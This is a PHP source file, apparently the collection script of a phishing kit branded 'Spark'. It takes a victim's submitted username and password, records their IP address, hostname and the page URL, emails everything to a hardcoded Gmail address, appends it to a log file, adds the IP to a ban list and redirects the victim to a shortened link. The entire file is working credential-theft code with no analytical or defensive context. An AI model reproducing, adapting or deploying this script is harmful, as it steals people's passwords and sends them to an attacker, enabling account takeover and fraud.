<?php

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

	$back = "https://tinyurl.com/myspark1";

	$message .= "<style>
		table {
		font-family: arial, sans-serif;
		border-collapse: collapse;
		width: 100%;
			width: 36%;
			border: 4px solid black;
		}

		td, th {
		border: 1px solid #000000;
		text-align: left;
		padding: 8px;
		}

		tr:nth-child(even) {
		background-color: #dddddd;
		}
		</style> <br>";

	$message .= "<table><tr><td style='font-weight: 700;color: #a33367cc;'>Login</td><td style='font-weight: 700;color: green;'>".$_POST['username']."</td></tr>";
	$message .= "<tr><td style='font-weight: 700;color: #a33367cc;'>Pass</td><td style='font-weight: 700;color: green;'>".$_POST['password']."</td></tr>";
	$message .= "<tr><td style='font-weight: 700;color: #a33367cc;'>IP</td><td style='font-weight: 700;color: red;'>".$ip."</td></tr>";
	$message .= "<tr><td style='font-weight: 700;color: #a33367cc;'>HN</td><td style='font-weight: 700;color: red;'>".$hostname."</td></tr>";
	$message .= "<tr><td style='font-weight: 700;color: #a33367cc;'>U7l</td><td style='font-weight: 700;color: red;'>".$link."</td></tr></table>";
	$message .= "<br>";

	$send = "alixe69asap@gmail.com";
	$subject = "Spark | ".$ip;
	$headers = "From: Spark <webmaster@localhost>";

	mail($send,$subject,$message,$headers);

	$file = fopen("../SE/Logs.html","a");
	fwrite($file, $message);
	fclose($file);

	$file2 = fopen("../SE/Ban.txt","a");
	fwrite($file2, $ip."\n");
	fclose($file2);

	header("Location: ".$back);

?>
